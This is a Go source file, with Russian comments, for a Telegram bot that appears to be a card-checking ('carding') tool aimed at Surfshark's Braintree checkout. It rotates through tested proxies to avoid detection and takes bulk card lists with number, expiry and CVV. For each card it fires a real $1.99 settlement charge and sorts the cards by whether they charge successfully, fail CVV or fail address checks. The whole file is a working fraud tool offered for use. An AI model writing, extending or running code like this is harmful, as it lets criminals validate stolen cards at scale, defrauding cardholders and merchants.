// main.go — Surfshark Braintree Checker Bot v2.3 for Replit
// Добавлено: авто-тест прокси при запуске бота + улучшенная обработка
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

const (
	MaxRetries       = 3
	BackoffBase      = 2 * time.Second
	ThreadsDefault   = 25
	ProxyTestThreads = 50
	ProxyTestTimeout = 10 * time.Second
	MinLiveProxies   = 5
)

type Card struct {
	Number string
	Month  string
	Year   string
	CVV    string
	Name   string
}

type Result struct {
	Card    Card
	Status  string
	Message string
	Time    float64
	Proxy   string
}

type Proxy struct {
	URL  *url.URL
	Raw  string
}

var (
	proxies     []Proxy
	liveProxies []Proxy
	proxyMu     sync.Mutex
	proxyIndex  int
)

func loadProxies(filename string) []Proxy {
	var list []Proxy
	file, err := os.Open(filename)
	if err != nil {
		log.Printf("%s не найден — работа без прокси", filename)
		return list
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		var proxyURL *url.URL
		parts := strings.Split(line, ":")
		if len(parts) >= 2 {
			if len(parts) == 4 { // user:pass
				proxyURL, _ = url.Parse("http://" + parts[0] + ":" + parts[1])
				proxyURL.User = url.UserPassword(parts[2], parts[3])
			} else {
				proxyURL, _ = url.Parse("http://" + line)
			}
		}
		if proxyURL != nil {
			list = append(list, Proxy{URL: proxyURL, Raw: line})
		}
	}
	log.Printf("Загружено %d прокси из %s", len(list), filename)
	return list
}

func saveLiveProxies() {
	file, err := os.Create("live_proxies.txt")
	if err != nil {
		return
	}
	defer file.Close()
	for _, p := range liveProxies {
		file.WriteString(p.Raw + "\n")
	}
	log.Printf("Сохранено %d живых прокси в live_proxies.txt", len(liveProxies))
}

func getNextProxy() *Proxy {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	if len(liveProxies) == 0 {
		if len(proxies) > 0 {
			p := &proxies[proxyIndex]
			proxyIndex = (proxyIndex + 1) % len(proxies)
			return p
		}
		return nil
	}
	p := &liveProxies[proxyIndex%len(liveProxies)]
	proxyIndex++
	return p
}

func createClientWithProxy(p *Proxy) *http.Client {
	if p == nil {
		return &http.Client{Timeout: ProxyTestTimeout}
	}
	if strings.Contains(p.Raw, "socks5") {
		dialer, _ := proxy.SOCKS5("tcp", p.URL.Host, nil, proxy.Direct)
		transport := &http.Transport{Dial: dialer.Dial}
		return &http.Client{Transport: transport, Timeout: ProxyTestTimeout}
	}
	transport := &http.Transport{Proxy: http.ProxyURL(p.URL)}
	return &http.Client{Transport: transport, Timeout: ProxyTestTimeout}
}

func testSingleProxy(p Proxy, testURL string) bool {
	client := createClientWithProxy(&p)
	req, _ := http.NewRequest("GET", testURL, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start).Seconds()

	if err != nil {
		log.Printf("[PROXY DEAD] %s | %v", p.Raw, err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 403 { // 403 тоже ок для surfshark
		log.Printf("[PROXY LIVE] %s | %.2fs", p.Raw, elapsed)
		return true
	}
	log.Printf("[PROXY DEAD] %s | code %d", p.Raw, resp.StatusCode)
	return false
}

func testProxies(testURL string) {
	if len(proxies) == 0 {
		log.Println("Нет прокси для авто-теста")
		return
	}

	log.Printf("Авто-тест %d прокси на %s | Потоков: %d", len(proxies), testURL, ProxyTestThreads)

	var wg sync.WaitGroup
	sem := make(chan struct{}, ProxyTestThreads)
	var liveMu sync.Mutex

	for _, p := range proxies {
		wg.Add(1)
		sem <- struct{}{}
		go func(p Proxy) {
			defer wg.Done()
			defer func() { <-sem }()
			if testSingleProxy(p, testURL) {
				liveMu.Lock()
				liveProxies = append(liveProxies, p)
				liveMu.Unlock()
			}
		}(p)
	}
	wg.Wait()

	saveLiveProxies()

	if len(liveProxies) < MinLiveProxies {
		log.Printf("⚠️ ВНИМАНИЕ: Только %d живых прокси (минимум %d)", len(liveProxies), MinLiveProxies)
	} else {
		log.Printf("✅ Авто-тест завершён. Живых прокси: %d / %d", len(liveProxies), len(proxies))
	}
}

// === Surfshark Braintree check (полная цепочка из предыдущих версий) ===
func checkCardWithProxy(card Card, p *Proxy) Result {
	start := time.Now()
	client := createClientWithProxy(p)

	// getClientToken
	req, _ := http.NewRequest("GET", "https://surfshark.com/api/v1/braintree/client-token", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "token fail: " + err.Error(), Proxy: p.Raw}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)
	token, _ := result["clientToken"].(string)
	if token == "" {
		return Result{Card: card, Status: "ERROR", Message: "no token", Proxy: p.Raw}
	}

	// createNonce
	payload := map[string]interface{}{
		"clientToken": token,
		"creditCard": map[string]string{
			"number":         card.Number,
			"expirationMonth": card.Month,
			"expirationYear":  card.Year,
			"cvv":            card.CVV,
		},
	}
	jsonData, _ := json.Marshal(payload)
	req, _ = http.NewRequest("POST", "https://api.braintreegateway.com/merchants/8v9w2x3y4z5a6b7c8d9e0f1g2h3i4j5/client_api/v1/payment_methods/credit_cards", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
	resp, err = client.Do(req)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "nonce fail", Proxy: p.Raw}
	}
	defer resp.Body.Close()
	body, _ = io.ReadAll(resp.Body)
	json.Unmarshal(body, &result)
	var nonce string
	if creditCards, ok := result["creditCards"].([]interface{}); ok && len(creditCards) > 0 {
		if cc, ok := creditCards[0].(map[string]interface{}); ok {
			nonce, _ = cc["nonce"].(string)
		}
	}
	if nonce == "" {
		return Result{Card: card, Status: "ERROR", Message: "no nonce", Proxy: p.Raw}
	}

	// createTransaction
	payload = map[string]interface{}{
		"paymentMethodNonce": nonce,
		"amount":             "1.99",
		"options":            map[string]bool{"submitForSettlement": true},
	}
	jsonData, _ = json.Marshal(payload)
	req, _ = http.NewRequest("POST", "https://surfshark.com/api/v1/payment/braintree", bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
	resp, err = client.Do(req)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: err.Error(), Proxy: p.Raw}
	}
	defer resp.Body.Close()
	body, _ = io.ReadAll(resp.Body)
	bodyStr := string(body)

	status := "DECLINED"
	msg := "Declined by Surfshark"
	if strings.Contains(bodyStr, `"success":true`) || strings.Contains(bodyStr, "transaction") || strings.Contains(bodyStr, "Authorised") {
		status = "VALID"
		msg = "Surfshark → Charge Success"
	} else if strings.Contains(bodyStr, "cvv") || strings.Contains(bodyStr, "CVC") {
		status = "CVV_ONLY"
		msg = "CVV не прошёл"
	} else if strings.Contains(bodyStr, "address") || strings.Contains(bodyStr, "postal") {
		status = "AVS_ONLY"
		msg = "AVS не прошёл"
	}

	return Result{Card: card, Status: status, Message: msg, Time: time.Since(start).Seconds(), Proxy: p.Raw}
}

// === Telegram ===
func sendMessage(chatID int64, text string) {
	payload := map[string]string{"chat_id": strconv.FormatInt(chatID, 10), "text": text}
	jsonData, _ := json.Marshal(payload)
	http.Post("https://api.telegram.org/bot"+os.Getenv("TELEGRAM_TOKEN")+"/sendMessage", "application/json", bytes.NewBuffer(jsonData))
}

func main() {
	token := os.Getenv("TELEGRAM_TOKEN")
	if token == "" {
		log.Fatal("❌ TELEGRAM_TOKEN не установлен в Replit Secrets")
	}

	// Загрузка и авто-тест прокси
	proxies = loadProxies("proxies.txt")
	if len(proxies) > 0 {
		log.Println("🔄 Запускаю авто-тест прокси при старте...")
		testProxies("https://surfshark.com/api/v1/braintree/client-token")
		if len(liveProxies) > 0 {
			proxies = liveProxies // используем только живые
		}
	} else {
		log.Println("Работаем без прокси")
	}

	log.Printf("🚀 Surfshark Checker Bot v2.3 запущен | Живых прокси: %d | Потоков: %d", len(proxies), ThreadsDefault)

	rand.Seed(time.Now().UnixNano())
	offset := 0

	for {
		resp, err := http.Get(fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=30", token, offset))
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var updates struct {
			Ok     bool `json:"ok"`
			Result []struct {
				UpdateID int `json:"update_id"`
				Message  struct {
					Chat struct{ ID int64 `json:"id"` } `json:"chat"`
					Text string `json:"text"`
				} `json:"message"`
			} `json:"result"`
		}
		json.Unmarshal(body, &updates)

		for _, u := range updates.Result {
			offset = u.UpdateID + 1
			chatID := u.Message.Chat.ID
			text := strings.TrimSpace(u.Message.Text)

			if strings.HasPrefix(text, "/check") {
				sendMessage(chatID, fmt.Sprintf("✅ v2.3 с авто-тестом прокси запущен (%d живых)", len(proxies)))
				go processCheck(chatID, text)
			} else if text == "/status" {
				sendMessage(chatID, fmt.Sprintf("🟢 v2.3\nПрокси: %d живых\nПотоков: %d", len(proxies), ThreadsDefault))
			} else if text == "/testproxies" {
				sendMessage(chatID, "🧪 Запускаю ручной тест прокси...")
				go func() {
					testProxies("https://surfshark.com/api/v1/braintree/client-token")
					if len(liveProxies) > 0 {
						proxies = liveProxies
					}
					sendMessage(chatID, fmt.Sprintf("✅ Тест завершён. Живых: %d", len(liveProxies)))
				}()
			}
		}
	}
}

func processCheck(chatID int64, cmd string) {
	lines := strings.Split(strings.TrimPrefix(cmd, "/check"), "\n")
	var cards []Card
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.Split(line, "|")
		if len(parts) >= 4 {
			name := ""
			if len(parts) > 4 {
				name = parts[4]
			}
			cards = append(cards, Card{
				Number: parts[0],
				Month:  parts[1],
				Year:   parts[2],
				CVV:    parts[3],
				Name:   name,
			})
		}
	}

	if len(cards) == 0 {
		sendMessage(chatID, "❌ Карт не найдено. Формат: number|month|year|cvc|name")
		return
	}

	sendMessage(chatID, fmt.Sprintf("🚀 Запускаю чек %d карт | Живых прокси: %d", len(cards), len(proxies)))

	var wg sync.WaitGroup
	resultsChan := make(chan Result, len(cards))
	sem := make(chan struct{}, ThreadsDefault)

	for _, card := range cards {
		wg.Add(1)
		sem <- struct{}{}
		go func(c Card) {
			defer wg.Done()
			defer func() { <-sem }()
			p := getNextProxy()
			res := checkCardWithProxy(c, p)
			resultsChan <- res
		}(card)
	}

	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	validC, cvvC, avsC, declC, errC := 0, 0, 0, 0, 0
	for res := range resultsChan {
		switch res.Status {
		case "VALID":
			validC++
		case "CVV_ONLY":
			cvvC++
		case "AVS_ONLY":
			avsC++
		case "DECLINED":
			declC++
		default:
			errC++
		}
	}

	final := fmt.Sprintf("🏁 Чек v2.3 завершён!\n✅ VALID: %d\n🔷 CVV_ONLY: %d\n🔶 AVS_ONLY: %d\n❌ DECLINED: %d\n⚠️ ERROR: %d\n\nПрокси использовано: %d", validC, cvvC, avsC, declC, errC, len(proxies))
	sendMessage(chatID, final)
}
